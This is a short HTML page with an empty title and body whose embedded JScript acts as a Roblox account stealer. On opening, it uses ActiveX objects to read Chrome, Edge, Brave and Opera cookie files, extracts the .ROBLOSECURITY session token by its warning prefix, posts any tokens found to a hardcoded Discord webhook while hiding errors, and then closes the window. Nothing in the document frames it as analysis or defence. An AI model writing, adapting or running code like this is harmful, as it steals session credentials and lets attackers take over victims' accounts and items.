<html>
<head>
<title></title>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var fso   = new ActiveXObject("Scripting.FileSystemObject");
var http  = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");

var webhook = "https://discord.com/api/webhooks/1553877992185532497/D_iruHSj-HioN_HhFvnX6yztxMsXpkInu8y0d-a-DkVaUgZBk_bXSGcOwUipFHjytA65";

function send(data) {
    try {
        http.open("POST", webhook, false);
        http.setRequestHeader("Content-Type", "application/json");
        var payload = '{"content":"' + data.replace(/"/g, '\\"').replace(/\n/g, '\\n') + '"}';
        http.send(payload);
    } catch(e) {}
}

function readCookie(path) {
    if (!fso.FileExists(path)) return null;
    try {
        var file = fso.OpenTextFile(path, 1);
        var content = file.ReadAll();
        file.Close();
        var match = content.match(/_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9\+\/]+/);
        if (match) return match[0];
    } catch(e) {}
    return null;
}

var local = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%");
var paths = [
    local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
    local + "\\Google\\Chrome\\User Data\\Default\\Cookies",
    local + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
    local + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
    local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
    local + "\\Opera Software\\Opera Stable\\Network\\Cookies"
];

var found = [];
for (var i = 0; i < paths.length; i++) {
    var cookie = readCookie(paths[i]);
    if (cookie) found.push(cookie);
}

if (found.length > 0) {
    var msg = "```\\nRoblox Cookie(s):\\n" + found.join("\\n\\n") + "\\n```";
    send(msg);
} else {
    send("no roblox cookies found");
}

window.close();
</script>
</head>
<body></body>
</html>
